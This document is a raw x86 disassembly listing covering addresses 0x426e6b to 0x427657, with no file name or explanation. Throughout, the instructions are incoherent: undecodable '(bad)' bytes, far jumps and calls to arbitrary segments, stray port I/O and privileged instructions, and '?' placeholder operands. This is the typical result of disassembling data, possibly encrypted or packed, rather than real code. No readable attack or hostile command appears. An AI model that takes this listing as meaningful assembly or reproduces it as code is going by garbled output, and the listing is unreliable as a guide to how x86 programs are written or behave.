  426e6b:	sub    eax,0xb8a54855
  426e70:	aas    
  426e71:	and    ecx,DWORD PTR [ecx+0x5f]
  426e74:	add    eax,0x88fd7daf
  426e79:	jmp    FWORD PTR [eax-0x7a36a71e]
  426e7f:	dec    ebp
  426e80:	(bad)  
  426e81:	adc    ebx,DWORD PTR [ecx-0x58de3ffa]
  426e87:	pop    ss
  426e88:	inc    esi
  426e89:	jnp    0x426e4e
  426e8b:	mov    si,0x8a0f
  426e8f:	test   DWORD PTR [ecx],ebp
  426e91:	fwait
  426e92:	mov    al,ds:0x7df54fde
  426e97:	cmp    eax,DWORD PTR [ebx-0x1a]
  426e9a:	lods   eax,DWORD PTR ds:[esi]
  426e9b:	and    edx,esi
  426e9d:	or     al,0xdf
  426e9f:	out    dx,eax
  426ea0:	jb     0x426e9a
  426ea2:	add    edx,DWORD PTR [edi]
  426ea4:	fisub  DWORD PTR ds:0xc873b5e7
  426eaa:	pop    edi
  426eab:	sub    DWORD PTR [ebx+0x48200d98],esi
  426eb1:	faddp  st(7),st
  426eb3:	test   DWORD PTR [edx],edx
  426eb5:	xchg   ecx,eax
  426eb6:	adc    bh,dl
  426eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426eba:	cmp    eax,0x7ed9e1f3
  426ebf:	rcr    edi,0x61
  426ec2:	fwait
  426ec3:	jns    0x426e61
  426ec5:	pop    edx
  426ec6:	(bad)  
  426ec7:	pop    ebx
  426ec8:	mov    ebp,edi
  426eca:	jle    0x426f37
  426ecc:	pop    ebp
  426ecd:	pop    DWORD PTR [edi+ebx*2-0x51f585f0]
  426ed4:	das    
  426ed5:	push   ebx
  426ed6:	test   BYTE PTR [esi],dl
  426ed8:	or     al,0x9d
  426eda:	outs   dx,DWORD PTR ds:[esi]
  426edb:	stos   DWORD PTR es:[edi],eax
  426edc:	mov    WORD PTR [esi-0x20],fs
  426edf:	ret    
  426ee0:	jmp    DWORD PTR [ebp-0x3c35cb03]
  426ee6:	mov    ds:0xfe499bd8,eax
  426eeb:	inc    edi
  426eec:	sbb    DWORD PTR [edi],edi
  426eee:	out    0xc3,al
  426ef0:	or     eax,0xf2e92822
  426ef5:	jecxz  0x426e87
  426ef7:	xor    eax,DWORD PTR [edi-0x33]
  426efa:	gs xchg ch,bl
  426efd:	adc    ah,BYTE PTR [ecx+eax*4+0x11]
  426f01:	fcmovu st,st(2)
  426f03:	mov    eax,0x66f104ee
  426f08:	cmp    DWORD PTR [edx-0x4fa59a69],0xffffffb0
  426f0f:	mov    bl,0x11
  426f11:	pushf  
  426f12:	pop    ebp
  426f13:	jae    0x426ef6
  426f15:	mov    ah,BYTE PTR [edi+0x277961f3]
  426f1b:	sahf   
  426f1c:	push   esi
  426f1d:	push   esi
  426f1e:	aam    0xbc
  426f20:	mov    al,ds:0x139d385f
  426f25:	cdq    
  426f26:	adc    ebx,DWORD PTR [eax+eiz*2+0x7d]
  426f2a:	into   
  426f2b:	lock das 
  426f2d:	(bad)  
  426f2e:	call   0xa4f8:0xec46891e
  426f35:	scas   eax,DWORD PTR es:[edi]
  426f36:	(bad)  
  426f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426f38:	push   eax
  426f39:	dec    edi
  426f3a:	in     al,dx
  426f3b:	push   ebx
  426f3c:	les    eax,FWORD PTR ds:0xb54a8e5a
  426f42:	ficomp WORD PTR [ecx]
  426f44:	outs   dx,DWORD PTR ds:[esi]
  426f45:	jmp    0xa042:0x949d3b6e
  426f4c:	rol    BYTE PTR [esi+0x9],0x26
  426f50:	mov    dl,0xf2
  426f52:	xor    BYTE PTR [edx-0x53a73263],dl
  426f58:	cmovns ebp,ebx
  426f5b:	sbb    eax,0xbc7962a0
  426f60:	in     eax,0x87
  426f62:	cmp    eax,0xdbfab92b
  426f67:	adc    DWORD PTR [ebx-0x11b41141],0x1f
  426f6e:	jp     0x426fc2
  426f70:	jae    0x426f85
  426f72:	out    0x2f,eax
  426f74:	shr    eax,cl
  426f76:	mov    al,0xfd
  426f78:	mov    ch,0x65
  426f7a:	cdq    
  426f7b:	daa    
  426f7c:	xor    BYTE PTR [esi+0x3d],dh
  426f7f:	clc    
  426f80:	pop    es
  426f81:	fdivrp st(2),st
  426f83:	ins    DWORD PTR es:[edi],dx
  426f84:	in     eax,dx
  426f85:	xchg   edx,eax
  426f86:	push   edi
  426f87:	jo     0x426f60
  426f89:	(bad)  
  426f8a:	pop    esp
  426f8b:	fistp  QWORD PTR [edx]
  426f8d:	fbstp  TBYTE PTR [edx]
  426f8f:	hlt    
  426f90:	shl    esi,cl
  426f92:	jmp    0x2d77:0xe98a101e
  426f99:	call   0xc841:0x21acc85c
  426fa0:	xchg   edx,ecx
  426fa2:	enter  0xe1c2,0x69
  426fa6:	test   BYTE PTR [ecx-0x3a0ed6ce],0x2
  426fad:	add    al,0x58
  426faf:	or     BYTE PTR [edx+0x2521b24e],0x44
  426fb6:	ins    BYTE PTR es:[edi],dx
  426fb7:	adc    al,0x3f
  426fb9:	or     al,0xc0
  426fbb:	repnz cmp esp,0xf
  426fbf:	xchg   edi,eax
  426fc0:	mov    al,0xc1
  426fc2:	jecxz  0x426fba
  426fc4:	call   0xb5e4e5e9
  426fc9:	sub    eax,DWORD PTR ds:0x15c74930
  426fcf:	pop    DWORD PTR [edi-0x1f]
  426fd2:	push   edi
  426fd3:	jl     0x426fc5
  426fd5:	pop    ebx
  426fd6:	hlt    
  426fd7:	push   0xffffffde
  426fd9:	lods   al,BYTE PTR ds:[esi]
  426fda:	and    ecx,DWORD PTR [eax+eax*8+0x728f3361]
  426fe1:	mov    bl,0x9f
  426fe3:	jmp    0x3628:0x7ea7899b
  426fea:	in     eax,0xc9
  426fec:	jmp    0xc706:0x89cf1649
  426ff3:	cmp    BYTE PTR [eax-0x36],ch
  426ff6:	mov    ch,0x5
  426ff8:	scas   al,BYTE PTR es:[edi]
  426ff9:	lahf   
  426ffa:	push   ecx
  426ffb:	or     DWORD PTR [eax],ebx
  426ffd:	jno    0x42704a
  426fff:	dec    eax
  427000:	iret   
  427001:	and    eax,0x1fa8fae2
  427006:	mov    ss:0xf4b11ddd,eax
  42700c:	xchg   edx,ecx
  42700e:	aad    0x65
  427010:	mov    ebx,0xf2afa5cd
  427015:	popa   
  427016:	call   0x3cb3898
  42701b:	retf   0xadf3
  42701e:	daa    
  42701f:	xor    al,0xb2
  427021:	int3   
  427022:	jns    0x426fdb
  427024:	jae    0x426ff4
  427026:	lods   al,BYTE PTR ds:[esi]
  427027:	cmp    cl,BYTE PTR [ecx+0x3a571f13]
  42702d:	(bad)  
  42702e:	fld    QWORD PTR [eax]
	...
  427038:	add    BYTE PTR [eax],al
  42703a:	cli    
  42703b:	rcl    DWORD PTR ds:0xfac73d07,cl
  427041:	jmp    DWORD PTR [ecx-0x475bc2eb]
  427047:	or     BYTE PTR [eax+0x1e672bc],dl
  42704d:	add    ch,bh
  42704f:	add    DWORD PTR [eax],eax
  427051:	add    BYTE PTR [esi-0x50f193d9],ch
  427057:	int3   
  427058:	aaa    
  427059:	push   edi
  42705a:	inc    esp
  42705b:	dec    esi
  42705c:	dec    esp
  42705d:	retf   0x1c58
  427060:	or     DWORD PTR [ebp+0x38],edi
  427063:	mov    bl,0x4a
  427065:	call   0x65ce:0xf7d55858
  42706c:	cdq    
  42706d:	cdq    
  42706e:	into   
  42706f:	xchg   esi,eax
  427070:	mov    ah,BYTE PTR es:[eax+0x47]
  427074:	mov    esi,0xeb45ca3e
  427079:	lds    ebx,FWORD PTR [si]
  42707c:	jp     0x4270d1
  42707e:	mov    esp,0xdd75abd3
  427083:	xchg   esp,eax
  427084:	pop    esi
  427085:	loopne 0x4270a5
  427087:	enter  0xcdfb,0x33
  42708b:	iret   
  42708c:	rcl    DWORD PTR [eax-0x507dd07d],1
  427092:	and    BYTE PTR [edi],ah
  427094:	inc    ecx
  427095:	dec    edx
  427096:	(bad)  
  427097:	out    dx,al
  427098:	imul   esi,DWORD PTR [ebx-0x1f513312],0xffffffcd
  42709f:	and    esi,eax
  4270a1:	pop    edx
  4270a2:	jne    0xa06b7865
  4270a8:	outs   dx,DWORD PTR ds:[esi]
  4270a9:	sbb    DWORD PTR [edi+0x73218252],eax
  4270af:	jp     0x4270ab
  4270b1:	pop    esp
  4270b2:	mov    bl,0x18
  4270b4:	lods   al,BYTE PTR ds:[esi]
  4270b5:	push   ebx
  4270b6:	fs inc ebp
  4270b8:	in     al,0x95
  4270ba:	mov    ebx,0x9f36043e
  4270bf:	mov    BYTE PTR [esi-0x739b3642],cl
  4270c5:	xchg   esi,eax
  4270c6:	(bad)  
  4270c7:	out    dx,al
  4270c8:	outs   dx,BYTE PTR ds:[esi]
  4270c9:	add    eax,0xbb37e446
  4270ce:	or     bl,BYTE PTR [ebp+0x535e6e12]
  4270d4:	push   0xb
  4270d6:	pop    es
  4270d7:	les    ecx,FWORD PTR [ebp+0x406de089]
  4270dd:	inc    ebx
  4270de:	pop    ecx
  4270df:	xchg   edx,eax
  4270e0:	lods   al,BYTE PTR ds:[esi]
  4270e1:	rol    BYTE PTR [esi-0x48],0xe1
  4270e5:	xchg   esi,eax
  4270e6:	mov    bl,0xe3
  4270e8:	xchg   DWORD PTR gs:[edi+0x14],edx
  4270ec:	pusha  
  4270ed:	in     eax,0x54
  4270ef:	sub    dl,BYTE PTR [ecx+esi*1+0x75]
  4270f3:	pop    esi
  4270f4:	cmc    
  4270f5:	adc    al,0xb8
  4270f7:	ins    BYTE PTR es:[edi],dx
  4270f8:	scas   eax,DWORD PTR es:[edi]
  4270f9:	or     al,BYTE PTR [edi+0x4a]
  4270fc:	loop   0x427110
  4270fe:	pop    ds
  4270ff:	cmp    edi,edi
  427101:	and    al,0xe9
  427103:	enter  0xf595,0x57
  427107:	cld    
  427108:	and    esi,esp
  42710a:	cmp    ecx,esp
  42710c:	aas    
  42710d:	shl    BYTE PTR [eax+0x707c52e7],1
  427113:	sar    BYTE PTR [ebx-0x27],1
  427116:	shr    dl,cl
  427118:	lds    eax,FWORD PTR [edx]
  42711a:	jmp    0x4270db
  42711c:	and    al,dh
  42711e:	inc    esp
  42711f:	xlat   BYTE PTR ds:[ebx]
  427120:	and    BYTE PTR [edi+0x6fc6f734],dl
  427126:	xchg   esi,eax
  427127:	mov    eax,ds:0x9688145e
  42712c:	rcl    BYTE PTR [ebp-0x56],1
  42712f:	mov    ebx,0x1313ee31
  427134:	repz enter 0xaa50,0x90
  427139:	jle    0x4271b6
  42713b:	ja     0x4271a9
  42713d:	inc    edx
  42713e:	inc    esp
  42713f:	jle    0x427117
  427141:	sbb    BYTE PTR [edi-0xaf09563],0xbd
  427148:	pushf  
  427149:	lods   al,BYTE PTR ds:[esi]
  42714a:	add    eax,0xc06bec63
  42714f:	neg    DWORD PTR [edx+eax*1+0x50afe6d2]
  427156:	imul   ebx,ebx,0xffffff82
  427159:	daa    
  42715a:	cwde   
  42715b:	rcl    ebx,0x3c
  42715e:	adc    edi,DWORD PTR [edi+eiz*4+0x1c7fd94]
  427165:	jmp    0x4271ac
  427167:	sbb    ecx,DWORD PTR [esi]
  427169:	push   ebp
  42716a:	inc    esi
  42716b:	inc    edx
  42716c:	shr    BYTE PTR [esi-0x2f],1
  42716f:	loop   0x427184
  427171:	jo     0x42714b
  427173:	add    al,BYTE PTR [ebx+esi*1-0x59]
  427177:	add    BYTE PTR [edi+0x40313219],bl
  42717d:	push   edi
  42717e:	fsub   DWORD PTR [edi-0x44b45015]
  427184:	or     cl,BYTE PTR [ecx+0x19]
  427187:	int3   
  427188:	pandn  mm0,QWORD PTR [ebx-0x5c]
  42718c:	fbld   TBYTE PTR [edi+0x46]
  42718f:	or     ah,cl
  427191:	not    BYTE PTR [ecx+0x488c33d0]
  427197:	fwait
  427198:	mov    cs,WORD PTR ds:0x8e77b1f9
  42719e:	idiv   DWORD PTR [edx-0x28]
  4271a1:	(bad)
  4271a4:	iret   
  4271a5:	or     ecx,eax
  4271a7:	pop    ecx
  4271a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271a9:	adc    bl,cl
  4271ab:	xchg   ebp,eax
  4271ac:	pusha  
  4271ad:	add    al,0xa1
  4271af:	mov    al,ds:0x6acf988
  4271b4:	cli    
  4271b5:	xchg   ebp,eax
  4271b6:	retf   0xcba
  4271b9:	int    0x56
  4271bb:	fstp   QWORD PTR ds:0xf003d3dc
  4271c1:	jecxz  0x42721d
  4271c3:	jle    0x427232
  4271c5:	sbb    eax,0x6feb2ca5
  4271ca:	mov    eax,0x9bd788e5
  4271cf:	ror    BYTE PTR [esi-0x42bdef10],1
  4271d5:	or     BYTE PTR [ecx-0x7f8a2d63],bh
  4271db:	les    eax,FWORD PTR [edx-0x54]
  4271de:	test   al,0x75
  4271e0:	scas   al,BYTE PTR es:[edi]
  4271e1:	aas    
  4271e2:	fwait
  4271e3:	(bad)  
  4271e4:	daa    
  4271e5:	mov    al,ds:0x8ebf59d0
  4271ea:	ror    cl,0x29
  4271ed:	xchg   esi,eax
  4271ee:	les    edx,FWORD PTR [edx]
  4271f0:	or     edi,DWORD PTR [edx+0x2a]
  4271f3:	(bad)  
  4271f4:	mov    ah,0x5b
  4271f6:	sbb    DWORD PTR [edi+esi*1+0x3f356161],edx
  4271fd:	pop    ds
  4271fe:	xlat   BYTE PTR ds:[ebx]
  4271ff:	rol    bl,cl
  427201:	jmp    0xfe2d9c10
  427206:	retf   0x2423
  427209:	push   0x5f
  42720b:	xor    edi,edi
  42720d:	mov    dh,0xd0
  42720f:	test   eax,0x77479bc8
  427214:	outs   dx,BYTE PTR ds:[esi]
  427215:	out    dx,al
  427216:	sub    ah,dh
  427218:	fwait
  427219:	ror    dh,0x39
  42721c:	bound  ebx,QWORD PTR [ebp+0x20f4efa5]
  427222:	daa    
  427223:	fdiv   DWORD PTR [ebx]
  427225:	faddp  st(2),st
  427227:	pop    edx
  427228:	in     al,0x73
  42722a:	add    al,ah
  42722c:	sbb    BYTE PTR [ebp-0x65],al
  42722f:	push   ss
  427230:	cmc    
  427231:	hlt    
  427232:	pop    ecx
  427233:	(bad)  
  427234:	ins    BYTE PTR es:[edi],dx
  427235:	xchg   esp,eax
  427236:	test   BYTE PTR [ebx],al
  427238:	pop    ebp
  427239:	mov    BYTE PTR cs:[edi-0x4e8467e5],ch
  427240:	inc    ecx
  427241:	mov    ebx,ds
  427243:	out    0xe1,eax
  427245:	fild   WORD PTR [ebx-0x27]
  427248:	or     DWORD PTR [edx+0x3eacae82],esi
  42724e:	mov    ds:0x0,eax
  427253:	add    BYTE PTR [eax],al
  427255:	add    BYTE PTR [eax],al
  427257:	add    BYTE PTR [eax],al
  427259:	add    bh,cl
  42725b:	neg    BYTE PTR [ebp-0x308442b0]
  427261:	(bad)  
  427262:	mov    ecx,0x43b02077
  427267:	dec    eax
  427268:	gs xchg esi,eax
  42726a:	outs   dx,DWORD PTR ds:[esi]
  42726b:	call   0x23f7271
  427270:	add    BYTE PTR [eax],al
  427272:	cmp    BYTE PTR [ebp-0x1],0xd8
  427276:	mov    ah,0x75
  427278:	jg     0x42729d
  42727a:	mov    cl,0x59
  42727c:	pushf  
  42727d:	and    ah,BYTE PTR [edx+0x1bd575af]
  427283:	inc    esp
  427284:	mov    ecx,0x494f09b1
  427289:	inc    esi
  42728a:	jp     0x4272ac
  42728c:	push   0x4ff08a2e
  427291:	test   al,0x45
  427293:	repnz mov BYTE PTR [esi],cl
  427296:	(bad)  
  427297:	ss inc edi
  427299:	mov    cs,WORD PTR [ecx+0x3f3bc448]
  42729f:	outs   dx,BYTE PTR ds:[esi]
  4272a0:	sub    al,0xc8
  4272a2:	xlat   BYTE PTR ds:[ebx]
  4272a3:	inc    edi
  4272a4:	add    cl,BYTE PTR [esi-0x3f]
  4272a7:	iret   
  4272a8:	fsub   QWORD PTR [edx]
  4272aa:	loopne 0x4272f6
  4272ac:	sti    
  4272ad:	fsubr  QWORD PTR [edi-0x739d1319]
  4272b3:	gs ins BYTE PTR es:[edi],dx
  4272b5:	push   ss
  4272b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272b7:	lahf   
  4272b8:	xchg   edi,eax
  4272b9:	out    0x6c,al
  4272bb:	inc    edi
  4272bc:	call   0x6a4d:0xfdc36f24
  4272c3:	push   ds
  4272c4:	cld    
  4272c5:	sbb    eax,0x384ba43f
  4272ca:	mov    DWORD PTR [edi-0xc0cd07f],edi
  4272d0:	cmp    edi,edx
  4272d2:	arpl   WORD PTR [ebx],si
  4272d4:	dec    ebp
  4272d5:	xor    eax,0xec2fc90c
  4272da:	dec    ecx
  4272db:	retf   0xe999
  4272de:	dec    edi
  4272df:	mov    ebp,0x4c9b5f96
  4272e4:	loope  0x42735e
  4272e6:	lahf   
  4272e7:	mov    al,0x4f
  4272e9:	and    al,0xd0
  4272eb:	scas   eax,DWORD PTR es:[edi]
  4272ec:	fsubr  st,st(0)
  4272ee:	mov    ebp,0xea0f9651
  4272f3:	nop
  4272f4:	add    dh,ch
  4272f6:	adc    ah,ah
  4272f8:	mov    bl,0xcc
  4272fa:	adc    eax,DWORD PTR [ebx+0x7c]
  4272fd:	ret    
  4272fe:	test   BYTE PTR [ecx+ebp*2+0x28],bl
  427302:	ret    
  427303:	inc    ebx
  427304:	or     eax,0xbd9aa5e8
  427309:	sti    
  42730a:	pop    ss
  42730b:	imul   esp,DWORD PTR [edi],0x2f
  42730e:	jl     0x427383
  427310:	adc    al,0x22
  427312:	dec    ebp
  427313:	iret   
  427314:	sti    
  427315:	sbb    eax,0xcc0c7e16
  42731a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42731c:	dec    ecx
  42731d:	jg     0x4272d4
  42731f:	mov    ecx,0x52b5e3e8
  427324:	jns    0x42736a
  427326:	add    ebp,esp
  427328:	inc    ebx
  427329:	xor    edx,DWORD PTR cs:[ecx-0x2ee0ddb3]
  427330:	and    esi,DWORD PTR [ebx-0x44]
  427333:	xchg   DWORD PTR [edi],esi
  427335:	je     0x42738a
  427337:	loop   0x42738d
  427339:	test   DWORD PTR [esp+esi*8],ebx
  42733c:	fucomip st,st(1)
  42733e:	inc    edi
  42733f:	int3   
  427340:	jns    0x42731f
  427342:	sub    DWORD PTR [ebp-0x28],edx
  427345:	rcl    bl,0x41
  427348:	je     0x4272cb
  42734a:	fwait
  42734b:	xlat   BYTE PTR ds:[ebx]
  42734c:	je     0x427321
  42734e:	sbb    eax,0xdfcee4be
  427353:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427354:	push   eax
  427355:	aas    
  427356:	mov    ds:0xad03c575,eax
  42735b:	ss mov eax,0xb3b2b1d4
  427361:	jbe    0x427375
  427363:	cmp    al,0x67
  427365:	xor    dh,ch
  427367:	push   ebx
  427368:	sub    BYTE PTR [ebx+edi*1-0xc0cf19c],bh
  42736f:	sbb    al,0xf0
  427371:	push   ds
  427372:	cmp    DWORD PTR [edx-0x525d875d],ebx
  427378:	call   0x73f411cb
  42737d:	xchg   BYTE PTR [edx-0x7965a385],dh
  427383:	adc    cl,BYTE PTR [ebx]
  427385:	jge    0x427328
  427387:	call   0x1c794276
  42738c:	stos   BYTE PTR es:[edi],al
  42738d:	aas    
  42738e:	add    edx,DWORD PTR [eax+0x698a3310]
  427394:	adc    al,0x50
  427396:	or     ch,bh
  427398:	outs   dx,DWORD PTR ds:[esi]
  427399:	jb     0x42731c
  42739b:	cmp    ch,al
  42739d:	ja     0x4273dd
  42739f:	inc    edi
  4273a0:	mov    ds:0x3041e952,eax
  4273a5:	mov    ch,0xe9
  4273a7:	retf   0x87f8
  4273aa:	dec    eax
  4273ab:	dec    esi
  4273ac:	push   esp
  4273ad:	inc    edx
  4273ae:	sar    ah,0x73
  4273b1:	mov    cl,0x4f
  4273b3:	dec    eax
  4273b4:	xor    DWORD PTR [ebp-0x7e6edf7],ebp
  4273ba:	jae    0x4273c9
  4273bc:	repz mov al,0x38
  4273bf:	out    dx,al
  4273c0:	das    
  4273c1:	pop    ecx
  4273c2:	fdiv   DWORD PTR [eax]
  4273c4:	retf   0xc81f
  4273c7:	daa    
  4273c8:	fcmovnu st,st(4)
  4273ca:	push   ds
  4273cb:	lahf   
  4273cc:	dec    esp
  4273cd:	push   es
  4273ce:	or     bh,BYTE PTR [ebx-0xc]
  4273d1:	into   
  4273d2:	cmp    dl,BYTE PTR [esi]
  4273d4:	jge    0x42742d
  4273d6:	mov    BYTE PTR [ebx-0x75],bl
  4273d9:	test   eax,0x60ca4279
  4273de:	mov    ebp,0xcd2e33b2
  4273e3:	xchg   edx,eax
  4273e4:	(bad)  
  4273e5:	pop    ebx
  4273e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273e7:	lock js 0x427415
  4273ea:	call   0xbf9a:0x45b9072a
  4273f1:	(bad)  
  4273f2:	jg     0x42737e
  4273f4:	test   BYTE PTR [edx-0x4f],0x44
  4273f8:	js     0x427434
  4273fa:	jmp    0x465eb6ec
  4273ff:	mul    BYTE PTR [edi]
  427401:	test   al,0x3e
  427403:	add    BYTE PTR [edi+0x5b3ccf70],dl
  427409:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42740a:	(bad)  
  42740b:	retf   
  42740c:	lds    edx,FWORD PTR [eax+edi*1]
  42740f:	std    
  427410:	mov    esi,0x6751691
  427415:	mov    ds:0x590de091,al
  42741a:	mov    ebp,?
  42741c:	mov    bl,0xa2
  42741e:	cmp    bh,bl
  427420:	adc    al,0xa7
  427422:	das    
  427423:	inc    ebp
  427424:	dec    ebx
  427425:	sti    
  427426:	dec    DWORD PTR [eax+0x6650f4db]
  42742c:	fcmovne st,st(6)
  42742e:	fisubr WORD PTR [edi]
  427430:	fsubr  QWORD PTR [ebp-0x46]
  427433:	loope  0x42745b
  427435:	aad    0x7f
  427437:	push   eax
  427438:	in     eax,0x51
  42743a:	pushf  
  42743b:	mov    ebx,0xf7886885
  427440:	xor    esi,DWORD PTR [ecx+edi*4+0x4e]
  427444:	in     al,0x95
  427446:	add    BYTE PTR ds:0x207f0694,dh
  42744c:	mov    bl,0x40
  42744e:	fwait
  42744f:	pusha  
  427450:	ds jno 0x4273dd
  427453:	(bad)  
  427454:	jmp    0x4273d8
  427456:	not    ch
  427458:	out    0xa8,al
  42745a:	and    esi,DWORD PTR [esi-0x2e]
  42745d:	popa   
  42745e:	iret   
  42745f:	inc    esp
  427460:	mov    cl,0x2e
  427462:	mov    ebx,0x3287d13c
  427467:	popa   
  427468:	pusha  
  427469:	cwde   
  42746a:	daa    
  42746b:	sbb    edx,edx
  42746d:	adc    ebx,DWORD PTR [eax+eax*1+0x0]
  427474:	add    BYTE PTR [eax],al
  427476:	add    BYTE PTR [eax],al
  427478:	add    BYTE PTR [eax],al
  42747a:	push   0x6f1e2d23
  42747f:	push   ds
  427480:	jnp    0x4274f9
  427482:	outs   dx,DWORD PTR ds:[esi]
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	clc    
  427487:	into   
  427488:	inc    esi
  427489:	ins    BYTE PTR es:[edi],dx
  42748a:	ins    BYTE PTR es:[edi],dx
  42748b:	jmp    0x0:0x1fd0001
  427492:	push   0xffffff95
  427494:	adc    DWORD PTR [esi],0x5327ad26
  42749a:	or     dh,bh
  42749c:	or     DWORD PTR [eax+eiz*2+0x2d53f4b8],esp
  4274a3:	cs scas eax,DWORD PTR es:[edi]
  4274a5:	or     ch,0x25
  4274a8:	ja     0x427527
  4274aa:	xor    DWORD PTR [eax+0x6c],ebx
  4274ad:	pusha  
  4274ae:	mov    WORD PTR [ebp+0x12],?
  4274b1:	dec    esi
  4274b2:	addr16 xchg edx,eax
  4274b4:	push   ecx
  4274b5:	dec    esi
  4274b6:	jae    0x4274c5
  4274b8:	imul   edx,DWORD PTR [ebx+0x23],0xc
  4274bc:	test   al,0x78
  4274be:	mov    ebp,0x28f6f48
  4274c3:	jns    0x427501
  4274c5:	fadd   DWORD PTR [edx]
  4274c7:	cmp    BYTE PTR [ecx+0x60cb9974],cl
  4274cd:	fmul   st(4),st
  4274cf:	adc    DWORD PTR [eax],edi
  4274d1:	in     eax,0x9a
  4274d3:	push   ss
  4274d4:	mov    ah,0x11
  4274d6:	dec    ebp
  4274d7:	repz xor al,0xcc
  4274da:	adc    BYTE PTR [ebp-0x5b],0x46
  4274de:	cmp    DWORD PTR [eax-0x73],edx
  4274e1:	pop    edi
  4274e2:	xor    DWORD PTR [edi-0x1a],ebx
  4274e5:	adc    esi,edi
  4274e7:	cmp    esi,0x46
  4274ea:	pop    edi
  4274eb:	nop
  4274ec:	mov    al,ds:0x48e26a9e
  4274f1:	xchg   esi,eax
  4274f2:	retf   
  4274f3:	int3   
  4274f4:	dec    esi
  4274f5:	fpatan 
  4274f7:	js     0x42752a
  4274f9:	aam    0x45
  4274fb:	and    eax,0x5ec1b897
  427500:	mov    ecx,0xed07143a
  427505:	add    ah,BYTE PTR [edx-0xa95b872]
  42750b:	xchg   esi,eax
  42750d:	jns    0x427542
  42750f:	fld    DWORD PTR [bx+si]
  427512:	sti    
  427513:	test   BYTE PTR [eax+0x1c1cf6ab],0xab
  42751a:	out    0x48,eax
  42751c:	scas   al,BYTE PTR es:[edi]
  42751d:	sub    BYTE PTR [esi],dh
  42751f:	imul   edi,DWORD PTR [eax-0x42],0x6a5bc130
  427526:	sub    ecx,DWORD PTR [eax]
  427528:	ror    DWORD PTR [edi],cl
  42752a:	cmp    BYTE PTR [ebp+0x134537b5],0xec
  427531:	scas   eax,DWORD PTR es:[edi]
  427532:	sbb    eax,DWORD PTR [ebx-0x71]
  427535:	(bad)  
  427536:	repz les edx,FWORD PTR [ebx+0x18eff4f2]
  42753d:	fist   DWORD PTR ds:0xcd8be4b0
  427543:	call   0x5fd5:0xfdeb37b3
  42754a:	sub    DWORD PTR [eax-0x56d723f7],eax
  427550:	retf   0xff2c
  427553:	pop    edx
  427554:	punpcklwd mm3,mm4
  427557:	add    al,cl
  427559:	pop    ebx
  42755a:	xor    BYTE PTR [edx],0x8a
  42755d:	and    eax,0x5642211f
  427562:	fiadd  DWORD PTR [edx]
  427564:	test   eax,0x7d063fdd
  427569:	outs   dx,BYTE PTR ds:[esi]
  42756a:	jbe    0x4275db
  42756c:	xchg   esp,ebx
  42756e:	sti    
  42756f:	pop    eax
  427570:	xchg   esp,eax
  427571:	retf   
  427572:	dec    ecx
  427573:	adc    ebp,DWORD PTR [ebx+esi*4]
  427576:	cmp    cl,BYTE PTR [edi]
  427578:	mov    ah,0xad
  42757a:	or     ebp,eax
  42757c:	fadd   QWORD PTR [eax]
  42757e:	out    0x38,eax
  427580:	add    bh,0xa5
  427583:	sti    
  427584:	aas    
  427585:	enter  0x8f3d,0x46
  427589:	or     al,0xc0
  42758b:	jns    0x4275ef
  42758d:	adc    BYTE PTR [esi+0x2d],dh
  427590:	repnz inc ebp
  427592:	add    DWORD PTR [esi],esi
  427594:	mov    ds:0x3d142dd,al
  427599:	xchg   ebp,eax
  42759a:	cmp    edi,eax
  42759c:	push   ebp
  42759d:	mov    bl,0x2f
  42759f:	xchg   ebp,eax
  4275a0:	pop    ebx
  4275a1:	mov    WORD PTR [esp+eax*1-0x6ad8a85c],ds
  4275a8:	lahf   
  4275a9:	mov    ds:0xebbc63ae,eax
  4275ae:	(bad)  [eax]
  4275b0:	(bad)  
  4275b2:	cmp    esp,DWORD PTR [edi-0x7c6c7094]
  4275b8:	out    0x90,al
  4275ba:	jae    0x4275af
  4275bc:	jo     0x4275d0
  4275be:	pop    es
  4275bf:	retf   0x8fc0
  4275c2:	jle    0x427578
  4275c4:	(bad)  
  4275c5:	test   BYTE PTR [esi-0x4b],ch
  4275c8:	jmp    0x4275e6
  4275ca:	out    0xc5,eax
  4275cc:	xchg   ecx,eax
  4275cd:	inc    edi
  4275ce:	out    dx,eax
  4275cf:	or     DWORD PTR [esi+0x3b4a87bc],ecx
  4275d5:	push   0xffffffe6
  4275d7:	loope  0x4275c3
  4275d9:	stc    
  4275da:	add    DWORD PTR [esi-0x71480fe6],0x2f895ced
  4275e4:	jmp    0x518bc8eb
  4275e9:	or     DWORD PTR [eax-0xcdd7f4a],ebx
  4275ef:	mov    ds:0x560999d3,eax
  4275f4:	inc    edi
  4275f5:	dec    ecx
  4275f6:	in     al,0xef
  4275f8:	das    
  4275f9:	cli    
  4275fa:	fdiv   st,st(0)
  4275fc:	xor    DWORD PTR [eax+0x43],edi
  4275ff:	div    DWORD PTR [edx-0x4da96b03]
  427605:	mov    ?,WORD PTR [ecx+0x35077202]
  42760b:	mov    ds:0x8268c9f,al
  427610:	inc    ecx
  427611:	sub    ah,BYTE PTR [ebp+0xec62b1a]
  427617:	out    0x55,al
  427619:	cmp    dl,dl
  42761b:	and    al,0xef
  42761d:	and    BYTE PTR [ebx+0x10],dl
  427620:	cmp    eax,esp
  427622:	mov    edx,esi
  427624:	call   0x6aef30b2
  427629:	inc    eax
  42762a:	loopne 0x427605
  42762c:	imul   eax,DWORD PTR [ecx+eax*1+0x6c],0x6d
  427631:	je     0x427645
  427633:	inc    ebx
  427634:	pop    edi
  427635:	imul   ebp,DWORD PTR [edi+0x665e8c8d],0xb04010a6
  42763f:	pop    esp
  427640:	jns    0x42769a
  427642:	aam    0x82
  427644:	inc    ebx
  427645:	push   edi
  427646:	pop    esp
  427647:	xchg   esp,eax
  427648:	cmp    cl,bh
  42764a:	inc    edx
  42764b:	jge    0x427653
  42764d:	mov    ds:0xd205c94a,al
  427652:	sub    edi,edi
  427654:	shl    DWORD PTR [edx],0xa
  427657:	mov    ebx,0xdff7bc46
